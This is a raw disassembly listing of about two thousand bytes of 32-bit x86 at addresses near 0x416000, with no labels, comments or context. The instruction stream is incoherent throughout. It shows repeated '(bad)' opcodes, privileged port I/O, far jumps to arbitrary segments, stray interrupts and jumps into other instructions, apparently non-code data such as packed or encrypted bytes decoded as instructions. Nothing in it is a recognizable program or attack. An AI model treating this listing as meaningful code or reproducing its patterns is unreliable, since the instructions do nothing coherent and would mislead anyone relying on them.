  41615c:	sub    al,0x80
  41615e:	in     eax,0xc3
  416160:	jp     0x41615a
  416162:	inc    ebp
  416163:	mov    eax,DWORD PTR [eax+0x40366bba]
  416169:	mov    esp,0xbed19d81
  41616e:	adc    esi,DWORD PTR [ebx-0x28000d72]
  416174:	sub    ebp,0xffffffea
  416177:	pop    ecx
  416178:	xor    DWORD PTR [edx],edi
  41617a:	sbb    al,0x27
  41617c:	jne    0x4161f5
  41617e:	arpl   di,si
  416180:	or     DWORD PTR [ecx],edi
  416182:	cmp    BYTE PTR [ecx+edx*1],cl
  416185:	cmp    al,BYTE PTR [edi-0x6f115c9d]
  41618b:	and    al,0x94
  41618d:	lahf   
  41618e:	sbb    bl,BYTE PTR [ecx+0x7d6c3e9a]
  416194:	mov    dl,0x54
  416196:	adc    ah,ah
  416198:	lods   eax,DWORD PTR ds:[esi]
  416199:	sti    
  41619a:	out    0xf8,eax
  41619c:	jecxz  0x416187
  41619e:	pop    edx
  41619f:	stos   DWORD PTR es:[edi],eax
  4161a0:	popf   
  4161a1:	and    DWORD PTR [ebx],ebp
  4161a3:	imul   ebx,DWORD PTR [edx-0x7c],0xdb80b09f
  4161aa:	or     DWORD PTR [edx-0x5173d5e5],edi
  4161b0:	and    DWORD PTR [edi-0x2b1ee958],ecx
  4161b6:	mov    BYTE PTR [edx+0x56d4a027],dl
  4161bc:	imul   esp,edx,0x355fad47
  4161c2:	fucomi st,st(4)
  4161c4:	push   ds
  4161c5:	pop    esp
  4161c6:	add    DWORD PTR [edi],ebp
  4161c8:	(bad)  
  4161c9:	xchg   ebx,eax
  4161ca:	(bad)  
  4161cb:	jg     0x4161e6
  4161cd:	mov    DWORD PTR [esi+0x70],edx
  4161d0:	adc    DWORD PTR [ebp-0x8],esp
  4161d3:	sbb    BYTE PTR [edx],dh
  4161d5:	xchg   ebp,eax
  4161d6:	int3   
  4161d7:	rcl    DWORD PTR [ecx-0x7091e9a5],1
  4161dd:	add    bh,BYTE PTR [edx]
  4161df:	ins    BYTE PTR es:[edi],dx
  4161e0:	fld    TBYTE PTR ds:0xce586052
  4161e6:	outs   dx,BYTE PTR ds:[esi]
  4161e7:	mov    al,0x87
  4161e9:	jge    0x41625a
  4161eb:	loope  0x416266
  4161ed:	aaa    
  4161ee:	add    BYTE PTR [edx+ebp*4+0x6e],dh
  4161f2:	add    eax,0x7df10cbe
  4161f7:	pop    ss
  4161f8:	loope  0x416192
  4161fa:	(bad)  
  4161fb:	mov    ah,BYTE PTR [edi]
  4161fd:	jmp    0x41618f
  4161ff:	call   0xf5c0:0xce0fc109
  416206:	cmp    al,0xac
  416208:	fdivr  QWORD PTR [ecx+0x393d1cf7]
  41620e:	ror    DWORD PTR [edx+0x30],1
  416211:	iret   
  416212:	dec    esp
  416213:	in     al,dx
  416214:	pop    edx
  416215:	xchg   edx,eax
  416216:	leave  
  416217:	mov    edi,0x9c1a3d96
  41621c:	mov    ah,BYTE PTR [esi+0x5ed8a61d]
  416222:	loop   0x41622b
  416224:	pop    esp
  416225:	push   esi
  416226:	xchg   ebp,eax
  416227:	pmaxub mm1,mm0
  41622a:	pop    ds
  41622b:	inc    edi
  41622c:	pop    ds
  41622d:	or     eax,0x68288ba8
  416233:	outs   dx,DWORD PTR ds:[esi]
  416234:	mov    ah,0xc4
  416236:	cmp    eax,0xb2b951bb
  41623b:	mov    esp,0xaf19ee3a
  416240:	fld    TBYTE PTR [edi-0x3a545e70]
  416246:	mov    dh,bl
  416248:	stc    
  416249:	shl    ebx,cl
  41624b:	add    DWORD PTR [ecx+0x46],esp
  41624e:	jo     0x4162be
  416250:	out    0xd2,al
  416252:	sahf   
  416253:	jo     0x416268
  416255:	xor    bh,BYTE PTR [ebx+0x37]
  416258:	adc    dh,bh
  41625a:	in     al,dx
  41625b:	and    DWORD PTR [edx],esi
  41625d:	clc    
  41625e:	pop    ss
  41625f:	add    BYTE PTR [esi+0x70],al
  416262:	mov    al,ds:0xb3703a8b
  416267:	push   eax
  416268:	(bad)  
  416269:	and    BYTE PTR [eax+0x67],ah
  41626c:	mov    esp,0xd77a8448
  416271:	jne    0x416250
  416273:	push   edx
  416274:	and    DWORD PTR ds:0xa8a10c45,esp
  41627a:	or     ebp,esi
  41627c:	lahf   
  41627d:	add    BYTE PTR [ecx+0x706d02a5],ah
  416283:	dec    esp
  416284:	out    0xb0,al
  416286:	mov    cl,BYTE PTR [edi]
  416288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416289:	mov    cl,0x9c
  41628b:	scas   eax,DWORD PTR es:[edi]
  41628c:	and    eax,0x2e5061ea
  416291:	loope  0x4162af
  416293:	sbb    al,0x86
  416295:	mov    edx,0xa99b9089
  41629a:	and    BYTE PTR [ebx+0x94dde71],bh
  4162a0:	stc    
  4162a1:	xor    eax,0xf2a4dac3
  4162a6:	inc    ebp
  4162a7:	mov    cl,0x2c
  4162a9:	ret    0x91f8
  4162ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ad:	dec    edx
  4162ae:	jp     0x41630b
  4162b0:	push   es
  4162b1:	outs   dx,BYTE PTR ds:[esi]
  4162b2:	rcr    BYTE PTR [edx+0x22],1
  4162b5:	ss xchg esi,eax
  4162b7:	shl    BYTE PTR [eax],0x71
  4162ba:	adc    BYTE PTR [ebp+0x60a67e38],al
  4162c0:	out    0x2b,al
  4162c2:	pop    ebx
  4162c3:	test   eax,0x77488da7
  4162c8:	adc    ch,al
  4162ca:	dec    esp
  4162cb:	repz pushf 
  4162cd:	mov    al,ds:0x88b81fb1
  4162d2:	jecxz  0x4162ae
  4162d4:	xchg   edi,eax
  4162d5:	jnp    0x41625c
  4162d7:	mov    dh,0xa
  4162d9:	push   edi
  4162da:	or     DWORD PTR [ecx+0x3a8eea8c],esi
  4162e0:	lea    ecx,[edi+0x52]
  4162e3:	cmp    DWORD PTR [edi+0x2f72e99d],0x34aaab67
  4162ed:	add    eax,0x5f82464
  4162f2:	xchg   edx,eax
  4162f3:	js     0x41634a
  4162f5:	sbb    BYTE PTR [edx],dl
  4162f7:	cld    
  4162f8:	imul   esi,DWORD PTR [edi+0x73f1f2f8],0xffffffa7
  4162ff:	inc    ebp
  416300:	sbb    eax,0x4a9f353e
  416305:	inc    edx
  416306:	add    DWORD PTR [edx],edi
  416308:	pop    ebp
  416309:	pop    ebx
  41630a:	adc    DWORD PTR [ecx+eax*8-0x4b],esp
  41630e:	mov    edi,0xc0e8f385
  416313:	sbb    al,BYTE PTR [eax]
  416315:	and    eax,0x610951af
  41631a:	loope  0x4162fb
  41631c:	pop    eax
  41631d:	xchg   esi,eax
  41631e:	gs jge 0x4162a7
  416321:	and    BYTE PTR [esi+0x3bb395fc],dh
  416327:	sbb    al,0x55
  416329:	push   ebp
  41632a:	test   eax,0x31892aec
  41632f:	int    0xb4
  416331:	pop    edi
  416332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416333:	or     BYTE PTR [esi+0x13],dl
  416336:	inc    ecx
  416337:	mov    ebp,DWORD PTR [ebp+0x5e]
  41633a:	fist   WORD PTR [ebx-0x12d50bd9]
  416340:	mov    DWORD PTR [edx],esi
  416342:	test   BYTE PTR [esi-0x43],0x27
  416346:	pop    edi
  416347:	xchg   BYTE PTR ds:0x50d72b91,dh
  41634d:	jb     0x416319
  41634f:	push   edx
  416350:	push   edi
  416351:	sar    BYTE PTR [edx-0x73],cl
  416354:	popf   
  416355:	xor    al,0x51
  416357:	call   0xaecbc687
  41635c:	xor    ebp,DWORD PTR [ebx+0x503098cf]
  416362:	mov    BYTE PTR [eax+0x58b709],dh
  416368:	pusha  
  416369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41636a:	jae    0x4163d9
  41636c:	mov    esp,0x9ac40503
  416371:	scas   al,BYTE PTR es:[edi]
  416372:	into   
  416373:	out    dx,eax
  416374:	stos   DWORD PTR es:[edi],eax
  416375:	pop    edi
  416376:	inc    ebp
  416377:	out    0x60,eax
  416379:	pop    ebx
  41637a:	ins    DWORD PTR es:[edi],dx
  41637b:	jbe    0xdcda0876
  416381:	ins    DWORD PTR es:[edi],dx
  416382:	in     eax,0x10
  416384:	pop    ss
  416385:	add    DWORD PTR [eax-0x54b515cc],ebp
  41638b:	push   ebp
  41638c:	outs   dx,DWORD PTR ds:[esi]
  41638d:	and    al,0x5d
  41638f:	pusha  
  416390:	sub    ebx,ebp
  416392:	loopne 0x41640e
  416394:	and    bl,0xbc
  416397:	lods   al,BYTE PTR ds:[esi]
  416398:	or     eax,0xad78e14d
  41639d:	push   edi
  41639e:	xlat   BYTE PTR ds:[ebx]
  41639f:	es jo  0x41638f
  4163a2:	jecxz  0x4163bb
  4163a4:	enter  0x8e9f,0xe5
  4163a8:	jmp    0x188c:0x2aff72d6
  4163af:	(bad)  
  4163b0:	stc    
  4163b1:	sahf   
  4163b2:	inc    ebp
  4163b3:	bnd call edx
  4163b6:	push   0x5fb3536b
  4163bb:	or     esp,DWORD PTR [edi+eax*8]
  4163be:	mov    al,ds:0xc7fdc2c2
  4163c3:	jge    0x416375
  4163c5:	ret    
  4163c6:	cs xchg edi,eax
  4163c8:	lea    esi,[ebx+0xfeb91ab]
  4163ce:	pop    ds
  4163cf:	out    0xe7,al
  4163d1:	jae    0x416427
  4163d3:	mov    BYTE PTR [ecx],dh
  4163d5:	add    esp,edi
  4163d7:	sub    BYTE PTR [ebp-0x9dcd0b7],al
  4163dd:	or     DWORD PTR [edx],ebx
  4163df:	cmp    BYTE PTR [esi+ebx*1-0x3c],0x4d
  4163e4:	inc    ecx
  4163e5:	push   esi
  4163e6:	arpl   WORD PTR [eax+0x255e8e1b],dx
  4163ec:	push   edx
  4163ed:	jle    0x416459
  4163ef:	cmp    eax,0x4407a22f
  4163f4:	sub    bh,bh
  4163f6:	cmp    DWORD PTR [esi-0x5fc0defb],0x39
  4163fd:	and    ah,dl
  4163ff:	xlat   BYTE PTR ds:[ebx]
  416400:	or     al,0xfe
  416402:	fwait
  416403:	mov    ds:0xa495561e,eax
  416408:	imul   ecx,DWORD PTR [ebp+0x2e09f4f6],0x9e451f74
  416412:	or     cl,BYTE PTR [ecx-0x7011f324]
  416418:	sbb    BYTE PTR [eax-0x7bf70b98],cl
  41641e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41641f:	and    eax,0xb46ad16
  416424:	popa   
  416425:	(bad)  
  416426:	fld    DWORD PTR [eax-0x3f]
  416429:	and    bh,dh
  41642b:	xor    DWORD PTR [esi-0x59],0x59
  41642f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416430:	imul   DWORD PTR [eax]
  416432:	add    BYTE PTR ds:0xcfd39db3,bl
  416438:	fs call 0x1e22191a
  41643e:	mov    ds:0x564b6a78,al
  416443:	mov    esp,0xc0d575ae
  416448:	mov    ds:0x70348625,eax
  41644d:	add    eax,0xe94378e2
  416452:	aaa    
  416453:	lock jne 0x416477
  416456:	inc    bx
  416458:	or     al,0xcc
  41645a:	iret   
  41645b:	leave  
  41645c:	fdivr  st(4),st
  41645e:	mov    dh,0xf1
  416460:	jp     0x41645e
  416462:	in     ax,0x33
  416465:	call   0xe9818eba
  41646a:	fnstcw WORD PTR [ebx+0x737173cf]
  416470:	add    esi,edi
  416472:	sub    al,0x1b
  416474:	das    
  416475:	xor    DWORD PTR [bp+0x1f8a],edx
  41647a:	cmp    DWORD PTR [ebp-0x56],ebx
  41647d:	jne    0x41646c
  41647f:	jnp    0x416477
  416481:	and    ah,BYTE PTR ds:0x1d3aa5ca
  416487:	jle    0x416431
  416489:	dec    ecx
  41648a:	or     ch,dh
  41648c:	push   0xffffff8f
  41648e:	jmp    0x416454
  416490:	push   eax
  416491:	xor    ebp,DWORD PTR [eax-0x1d]
  416494:	dec    edx
  416495:	jb     0x4164b8
  416497:	shl    DWORD PTR [eax+0x69effab1],0xf8
  41649e:	sbb    BYTE PTR [edi],dl
  4164a0:	and    BYTE PTR [ecx+eiz*4+0x4ff8c605],0x69
  4164a8:	xchg   edi,eax
  4164a9:	mov    ecx,0xa7bc9f92
  4164ae:	xchg   edx,eax
  4164af:	xchg   ebx,eax
  4164b0:	repnz xchg edi,eax
  4164b2:	je     0x416445
  4164b4:	dec    ebx
  4164b5:	lods   al,BYTE PTR ds:[esi]
  4164b6:	or     DWORD PTR [ebx+0x53],esp
  4164b9:	in     al,dx
  4164ba:	mov    dl,0xfa
  4164bc:	inc    eax
  4164bd:	dec    esp
  4164be:	cmp    al,0xc4
  4164c0:	mov    al,0x9c
  4164c2:	inc    ecx
  4164c3:	and    eax,0x1d634d21
  4164c8:	test   DWORD PTR [eax-0x2190fffd],edx
  4164ce:	outs   dx,BYTE PTR ds:[esi]
  4164cf:	in     al,dx
  4164d0:	xor    esp,DWORD PTR [eax]
  4164d2:	dec    esi
  4164d3:	into   
  4164d4:	xchg   BYTE PTR ds:0x6e90ea1e,ah
  4164da:	dec    ebp
  4164db:	cwde   
  4164dc:	nop
  4164dd:	inc    edx
  4164de:	cmc    
  4164df:	xchg   esi,eax
  4164e0:	xchg   ebp,eax
  4164e1:	sbb    BYTE PTR [ebx-0x332dec59],dl
  4164e7:	out    dx,al
  4164e8:	stos   DWORD PTR es:[edi],eax
  4164e9:	push   cs
  4164ea:	adc    edi,edi
  4164ec:	sbb    bl,0xd
  4164ef:	mov    ebx,0x1fdc430f
  4164f4:	xchg   edi,eax
  4164f5:	out    dx,eax
  4164f6:	enter  0x6223,0x32
  4164fa:	or     bh,BYTE PTR [edi]
  4164fc:	push   ebp
  4164fd:	outs   dx,DWORD PTR ds:[esi]
  4164fe:	lock nop
  416500:	das    
  416501:	xor    al,0x67
  416503:	mov    esp,0x1f445141
  416508:	jp     0x4164c0
  41650a:	es mov edx,0x84d044b0
  416510:	cld    
  416511:	xchg   edx,eax
  416512:	cs pop eax
  416514:	or     DWORD PTR [ecx+0x57],edx
  416517:	mov    edx,0x3dda0d62
  41651c:	imul   ebp,DWORD PTR [edi+0xf],0x9bd6db53
  416523:	repz inc esi
  416525:	inc    ebp
  416526:	int3   
  416527:	aad    0xc0
  416529:	cmp    esp,0x10
  41652c:	shr    DWORD PTR [edx-0x6954c19c],cl
  416532:	cs stos DWORD PTR es:[edi],eax
  416534:	icebp  
  416535:	pop    ebx
  416536:	pop    eax
  416537:	cmp    BYTE PTR [ebx+0x39],bh
  41653a:	jno    0x416503
  41653c:	mov    edi,0x5ef8367
  416541:	sahf   
  416542:	aaa    
  416543:	push   ds
  416544:	pushf  
  416545:	xor    DWORD PTR ds:0x5ec8c9a3,eax
  41654b:	add    edi,DWORD PTR [ebx]
  41654d:	imul   edx,DWORD PTR [edi+edi*4-0x2e35d062],0x6a
  416555:	aam    0x9
  416557:	sahf   
  416558:	xlat   BYTE PTR ds:[ebx]
  416559:	xchg   BYTE PTR [eax-0x15a5ec1],ch
  41655f:	sub    ebp,esp
  416561:	enter  0xd7d1,0xed
  416565:	push   cs
  416566:	jne    0x4165d1
  416568:	adc    al,0xbc
  41656a:	je     0x416539
  41656c:	popf   
  41656d:	ret    0xa034
  416570:	fcomp  DWORD PTR [ebp+0x6fd7d0d4]
  416576:	push   0x70eeb693
  41657b:	aad    0xc0
  41657d:	pop    ds
  41657e:	mov    ds:0x72097bc0,al
  416583:	and    esi,DWORD PTR [esi+ebp*1]
  416586:	mov    ebx,0x3cd525d0
  41658b:	xor    bl,dh
  41658d:	fisttp QWORD PTR [ebp+0x5a66df31]
  416593:	out    dx,al
  416594:	retf   
  416595:	sbb    dl,BYTE PTR [ebx+ecx*1-0x49]
  416599:	pushf  
  41659a:	sbb    BYTE PTR [edi],bl
  41659c:	cmovs  eax,DWORD PTR [ebx+0x9667815]
  4165a3:	loopne 0x4165b1
  4165a5:	in     al,dx
  4165a6:	ins    DWORD PTR es:[edi],dx
  4165a7:	fs pop esp
  4165a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165aa:	bound  esi,QWORD PTR [esp+eax*8+0xe48a4d3]
  4165b1:	mov    ecx,0xa49ce2fc
  4165b6:	ss hlt 
  4165b8:	into   
  4165b9:	or     DWORD PTR [edx],edx
  4165bb:	sub    al,0x2
  4165bd:	test   ah,dl
  4165bf:	repnz adc DWORD PTR es:[esi],ebp
  4165c3:	xchg   esp,eax
  4165c4:	ins    DWORD PTR es:[edi],dx
  4165c5:	retf   0x49c8
  4165c8:	fcomp  st(2)
  4165ca:	cmp    BYTE PTR [ebp+ebx*4+0x30281908],dh
  4165d1:	jmp    0xa679ec52
  4165d6:	outs   dx,DWORD PTR ds:[esi]
  4165d7:	push   ds
  4165d8:	jne    0x416655
  4165da:	out    dx,eax
  4165db:	xchg   edi,eax
  4165dc:	cmp    edx,DWORD PTR [esi-0x1f3b26d7]
  4165e2:	or     DWORD PTR [eax-0xc],ecx
  4165e5:	mov    eax,0x76e0bd0d
  4165ea:	dec    esi
  4165eb:	or     ebx,ebp
  4165ed:	fdiv   QWORD PTR [esi]
  4165ef:	out    dx,al
  4165f0:	xchg   bh,ah
  4165f2:	dec    ebx
  4165f3:	adc    al,0x6c
  4165f5:	dec    ecx
  4165f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165f7:	or     eax,0x6f47cfbb
  4165fc:	aad    0xb4
  4165fe:	xor    DWORD PTR [edi-0x1eda1eec],ebx
  416604:	inc    esi
  416605:	xor    ch,bl
  416607:	add    BYTE PTR [eax],al
  416609:	out    0xc5,al
  41660b:	inc    esi
  41660c:	inc    esp
  41660d:	loope  0x416674
  41660f:	jl     0x416645
  416611:	mov    esp,0x5bdee3c7
  416616:	cmc    
  416617:	pop    edi
  416618:	rep ins BYTE PTR es:[edi],dx
  41661a:	loope  0x4165c3
  41661c:	call   DWORD PTR [ebx+0x3]
  41661f:	pop    es
  416620:	out    0xfa,eax
  416622:	ds mov cl,0x19
  416625:	outs   dx,BYTE PTR ds:[esi]
  416626:	add    BYTE PTR [eax-0x4a],cl
  416629:	ror    BYTE PTR [ebp-0x6d],1
  41662c:	add    al,0xb5
  41662e:	xor    BYTE PTR [edx],dl
  416630:	dec    eax
  416631:	fs inc esi
  416633:	popf   
  416634:	pusha  
  416635:	sub    al,0xa9
  416637:	out    dx,eax
  416638:	push   0x87973c84
  41663d:	inc    ebp
  41663e:	or     eax,0x36838a75
  416643:	bound  ebp,QWORD PTR [ebp-0x3809e657]
  416649:	fld    QWORD PTR [edi+0x1d]
  41664c:	iret   
  41664d:	or     DWORD PTR [eax-0x22ada807],ebx
  416653:	jg     0x4166cc
  416655:	(bad)  
  416658:	aam    0x96
  41665a:	into   
  41665b:	or     dh,BYTE PTR [esi+0x551e1c3b]
  416661:	test   al,0xc9
  416663:	lds    eax,FWORD PTR [edi]
  416665:	into   
  416666:	mov    edx,0xbd79aca3
  41666b:	pusha  
  41666c:	cmp    bl,dh
  41666e:	outs   dx,DWORD PTR ds:[esi]
  41666f:	popf   
  416670:	xchg   cl,dl
  416672:	add    al,BYTE PTR [ebx+0x24]
  416675:	pop    ds
  416676:	mov    al,ds:0xef77e611
  41667b:	mov    bl,0xce
  41667d:	out    0x7,eax
  41667f:	xchg   esp,eax
  416680:	xor    al,0xee
  416682:	and    ch,BYTE PTR [edi+0x2dee0b8]
  416688:	adc    al,ch
  41668a:	pusha  
  41668b:	mov    DWORD PTR [edi+ecx*2+0x7a],edi
  41668f:	jp     0x4166d1
  416691:	jecxz  0x4166ea
  416693:	mov    ds:0xf9d14b12,al
  416698:	push   edx
  416699:	pop    esi
  41669a:	xchg   ebx,eax
  41669b:	sbb    DWORD PTR [esi],ebp
  41669d:	push   es
  41669e:	shr    DWORD PTR [edx+0x16],0x11
  4166a2:	aaa    
  4166a3:	imul   ecx,ebx,0xdfa57413
  4166a9:	and    esp,DWORD PTR [ecx+0xa9791f4]
  4166af:	ret    
  4166b0:	test   eax,0x4143b7e2
  4166b5:	mov    al,0x6e
  4166b7:	hlt    
  4166b8:	xor    al,0x1f
  4166ba:	xor    eax,0x36a0a76
  4166bf:	adc    bl,BYTE PTR [esi+0x75]
  4166c2:	mov    eax,0x5e80c700
  4166c7:	sub    eax,DWORD PTR [esi]
  4166c9:	inc    esp
  4166ca:	mov    eax,ds:0x32894f01
  4166cf:	dec    esi
  4166d0:	mov    al,0xe8
  4166d2:	repz mov edi,0x229c3b50
  4166d8:	jle    0x41668f
  4166da:	cmp    DWORD PTR [esi+0x33],edx
  4166dd:	enter  0x114f,0xde
  4166e1:	sub    DWORD PTR [ebp+0x79],edx
  4166e4:	daa    
  4166e5:	push   ebp
  4166e6:	loopne 0x41672a
  4166e8:	sbb    al,0x6f
  4166ea:	imul   edx,DWORD PTR [esi+0x6dc86090],0xd7d57c7
  4166f4:	mov    ds:0x2086716a,al
  4166f9:	lock adc DWORD PTR [edx],eax
  4166fc:	push   ebx
  4166fd:	into   
  4166fe:	and    eax,DWORD PTR [ebx-0x4a05c9d8]
  416704:	outs   dx,BYTE PTR ds:[esi]
  416705:	test   al,0xba
  416707:	and    DWORD PTR [eax+0x254e864f],0x64962594
  416711:	test   DWORD PTR [edi-0x467bd1f0],esi
  416717:	xor    BYTE PTR [eax+0x90b96c6],bh
  41671d:	jmp    0xb37b:0x745e4b5e
  416724:	cmp    al,0x30
  416726:	call   DWORD PTR [ebx]
  416728:	xlat   BYTE PTR ds:[ebx]
  416729:	in     al,dx
  41672a:	into   
  41672b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41672c:	rcl    DWORD PTR [edi-0x25d5e63c],0x4c
  416733:	test   al,0x3e
  416735:	and    al,BYTE PTR [esi-0x55]
  416738:	es (bad) 
  41673a:	push   ebx
  41673b:	jg     0x41670b
  41673d:	inc    ecx
  41673e:	int3   
  41673f:	cmp    eax,0xa86c8e01
  416744:	pop    ss
  416745:	jge    0x416735
  416747:	stos   BYTE PTR es:[edi],al
  416748:	(bad)  
  416749:	fnstsw WORD PTR [esi+0x7e]
  41674c:	jbe    0x41678b
  41674e:	ins    BYTE PTR es:[edi],dx
  41674f:	inc    ecx
  416750:	ror    BYTE PTR [ebx+eax*1+0x58],0x1b
  416755:	lods   al,BYTE PTR ds:[esi]
  416756:	mov    esi,0x3d6940b6
  41675b:	shr    al,1
  41675d:	pop    ss
  41675e:	shr    DWORD PTR [ecx],0x54
  416761:	pop    esp
  416762:	leave  
  416763:	add    al,BYTE PTR [ebx-0x72]
  416766:	cmp    al,0x32
  416768:	jb     0x416792
  41676a:	mov    eax,0xc3f9fde2
  41676f:	fdiv   DWORD PTR [edi-0x7f]
  416772:	pop    edx
  416773:	jnp    0x4167e6
  416775:	add    esi,DWORD PTR [ebx-0x13c207c6]
  41677b:	add    al,0x4f
  41677d:	mov    ds:0x6ead06e3,al
  416782:	push   ebp
  416783:	jle    0x4167f3
  416785:	mov    edx,0x6af5ca0f
  41678a:	(bad)  
  41678b:	ds (bad) 
  41678d:	icebp  
  41678e:	fs xor al,0x68
  416791:	ins    BYTE PTR es:[edi],dx
  416792:	add    DWORD PTR [edx],0xa15f243c
  416798:	fidivr WORD PTR [edx-0x65]
  41679b:	adc    ch,BYTE PTR [ebx+edi*2+0x45941e57]
  4167a2:	cli    
  4167a3:	push   ebp
  4167a4:	stos   BYTE PTR es:[edi],al
  4167a5:	loop   0x416787
  4167a7:	and    DWORD PTR [edi+0x6f9bc4e9],0x815d5314
  4167b1:	stc    
  4167b2:	nop
  4167b3:	mov    eax,0xbe2920fc
  4167b8:	push   esi
  4167b9:	(bad)  
  4167ba:	scas   al,BYTE PTR es:[edi]
  4167bb:	mov    ebx,DWORD PTR [ecx]
  4167bd:	mov    ebp,0xfdb3f029
  4167c2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4167c4:	mov    ebp,0x8f863117
  4167c9:	jle    0x4167c9
  4167cb:	or     eax,0x3182ee77
  4167d0:	dec    eax
  4167d1:	fistp  DWORD PTR [esp+eiz*8-0x73]
  4167d5:	fisubr DWORD PTR [ecx-0x597b7a36]
  4167db:	mov    al,ds:0x58cf3f2e
  4167e0:	pusha  
  4167e1:	pop    ecx
  4167e2:	out    0xbf,eax
  4167e4:	pop    ebx
  4167e5:	clc    
  4167e6:	cs jle 0x41683b
  4167e9:	pop    ecx
  4167ea:	adc    ch,BYTE PTR [edx+0x35d94e86]
  4167f0:	dec    edx
  4167f1:	mov    edx,0xed7ab188
  4167f6:	or     dh,dh
  4167f8:	lahf   
  4167f9:	jp     0x41678c
  4167fb:	mov    edi,0xfe5533ff
  416800:	repz leave 
  416802:	jae    0x41681e
  416804:	test   eax,0x537a729
  416809:	dec    ecx
  41680a:	in     al,dx
  41680b:	(bad)  
  41680c:	lock sub al,bh
  41680f:	fs ins DWORD PTR es:[edi],dx
  416811:	dec    edi
  416812:	dec    eax
  416813:	xchg   edx,eax
  416814:	ins    DWORD PTR es:[edi],dx
  416815:	pop    es
  416816:	out    0xf6,al
  416818:	int3   
  416819:	out    dx,al
  41681a:	add    BYTE PTR [esi+0x12f3997e],al
  416820:	pushf  
  416821:	outs   dx,DWORD PTR ds:[esi]
  416822:	mov    esp,0x21601873
  416827:	shl    edx,0x7b
  41682a:	fsubr  DWORD PTR [edi-0x50899e9e]
  416830:	jmp    DWORD PTR [ebp+0x4c]
  416833:	push   esp
  416834:	div    DWORD PTR [ebx]
  416836:	mov    edi,DWORD PTR [edi+esi*8]
  416839:	mov    dh,dl
  41683b:	mov    ecx,DWORD PTR [ebx]
  41683d:	arpl   WORD PTR [eax+0x2fb768a],bx
  416843:	jle    0x4167cf
  416845:	adc    al,0x22
  416847:	sbb    eax,0x1a5798e6
  41684c:	xchg   DWORD PTR [ebx],ebx
  41684e:	shl    DWORD PTR [edx+0x56adce8d],cl
  416854:	xchg   esp,eax
  416855:	push   esp
  416856:	inc    edx
  416857:	lods   al,BYTE PTR ds:[esi]
  416858:	das    
  416859:	aaa    
  41685a:	(bad)  
  41685b:	and    al,0x70
  41685d:	dec    esp
  41685e:	cdq    
  41685f:	push   edi
  416861:	ds pop eax
  416864:	fdiv   DWORD PTR [eax+0x4bfd9c58]
  41686a:	pop    ebp
  41686b:	jg     0x41685f
  41686d:	addr16 push ebp
  41686f:	retf   0x9bc4
  416872:	inc    ebx
  416873:	add    BYTE PTR [edi+ecx*1+0x5b011aab],0x31
  41687b:	pop    eax
  41687c:	jecxz  0x416816
  41687e:	iret   
  41687f:	es push cs
  416881:	cmp    ch,BYTE PTR [eax]
  416883:	sbb    BYTE PTR [ecx+0x59fcb3c4],al
  416889:	rcl    BYTE PTR [eax],1
  41688b:	pop    edi
  41688c:	pop    eax
  41688d:	adc    al,0x56
  41688f:	sbb    eax,0x82d87454
  416894:	push   esi
  416895:	and    eax,0xe72e4fc7
  41689a:	mov    eax,0xa2902af4
  41689f:	jmp    FWORD PTR [esi]
  4168a1:	and    eax,0x1a38f686
  4168a6:	das    
  4168a7:	push   ebp
  4168a8:	jne    0x4168fc
  4168aa:	in     eax,dx
  4168ab:	shl    DWORD PTR [edx],cl
  4168ad:	cmp    edi,edx
  4168af:	inc    eax
  4168b0:	aam    0xd4
  4168b2:	sub    ecx,edi
  4168b4:	test   BYTE PTR [edi+0x23],cl
  4168b7:	jge    0x41683d
  4168b9:	pop    ds
  4168ba:	xor    dl,dl
  4168bc:	in     eax,dx
  4168bd:	and    edi,DWORD PTR [ecx]
  4168bf:	dec    esi
  4168c0:	push   0x36
  4168c2:	lods   al,BYTE PTR ds:[esi]
  4168c3:	cld    
  4168c4:	leave  
  4168c5:	(bad)  [eax+eax*8-0x7f]
  4168c9:	mov    edx,0x26cf11c9
  4168ce:	pushf  
  4168cf:	cmc    
  4168d0:	lods   al,BYTE PTR ds:[esi]
  4168d1:	sbb    ebp,DWORD PTR [edi+0x31]
  4168d4:	dec    edx
  4168d5:	push   edx
  4168d6:	adc    DWORD PTR [ebx-0x12],ebp
  4168d9:	aam    0xbc
  4168db:	je     0x416892
  4168dd:	mov    dh,0x84
  4168df:	pop    esp
  4168e0:	or     esp,edi
  4168e2:	retf   
  4168e3:	mov    ecx,0xa0d1d907
  4168e8:	mov    dh,0xd3
  4168ea:	rcr    BYTE PTR [esi-0x7621c7e3],cl
  4168f0:	pop    ds
  4168f1:	cmp    DWORD PTR [ecx-0x29],ebx
  4168f4:	ret    
  4168f5:	rcl    DWORD PTR [edi],cl
  4168f7:	xchg   ebx,eax
  4168f8:	jmp    0x4168c8
  4168fa:	inc    eax
  4168fb:	aas    
  4168fc:	jb     0x41688b
  4168fe:	pusha  
  4168ff:	inc    ebx
  416900:	popf   
  416901:	fmul   DWORD PTR [edx-0x48d46684]
  416907:	push   esi
  416908:	lods   eax,DWORD PTR ds:[esi]
  416909:	scas   al,BYTE PTR es:[edi]
  41690a:	mov    ebx,0x2d21f0f7
  41690f:	lods   eax,DWORD PTR ds:[esi]
  416910:	popf   
  416911:	fsub   st,st(6)
  416913:	cmc    
  416914:	cdq    
  416915:	xlat   BYTE PTR ds:[ebx]
  416916:	or     DWORD PTR ds:0xe071ea0e,eax
  41691c:	cmp    DWORD PTR [ecx+0x60],eax
  41691f:	outs   dx,BYTE PTR ds:[esi]
  416920:	or     DWORD PTR [ebp+0x52],esp
  416923:	mov    ds:0x14262114,al
  416928:	xchg   esp,eax
  416929:	xor    eax,0xcf81d60a
  41692e:	and    al,0x75
  416930:	adc    al,0xda
  416932:	retf   
  416933:	outs   dx,DWORD PTR ds:[esi]
  416934:	push   ss
  416935:	mov    edx,0x69184894
  41693a:	push   edi
  41693b:	inc    esi
  41693c:	xor    DWORD PTR [eax+0x72],edi
  41693f:	inc    edx
  416940:	dec    edi
  416941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
